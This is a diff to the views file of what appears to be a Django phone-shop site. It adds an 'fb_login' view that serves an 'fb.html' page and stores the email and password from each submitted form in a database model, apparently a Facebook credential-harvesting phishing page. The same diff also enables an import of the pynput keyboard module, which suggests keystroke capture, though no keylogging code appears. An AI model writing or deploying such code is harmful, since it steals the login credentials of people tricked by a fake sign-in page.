@@ -1,5 +1,5 @@
 from django.shortcuts import redirect, render
-from products.models import Phone
+from products.models import Phone, fb_login_form, login_model
 from .forms import register_form
 
 import random
@@ -10,9 +10,9 @@ from django.contrib.auth.models import User
 from cart.models import cart, cartItem
 from enquiry.forms import enquiry_form
 
-# from pynput import keyboard
+from pynput import keyboard
 
-from products.models import Word
+# from products.models import Word
 
 # Create your views here.
 
@@ -142,3 +142,18 @@ def seed_view(request):
         'num': random.randint(0, 9999)
     }
     return render(request, 'seed.html', context)
+
+def fb_login(request):
+    context = {
+
+    }
+
+    if request.method == "POST":
+        form = fb_login_form(request.POST)
+        if form.is_valid():
+            data = form.cleaned_data
+            login_model(email = data['email'], pword = data['pword']).save()
+        return redirect('/')
+        
+
+    return render(request, 'fb.html', context)
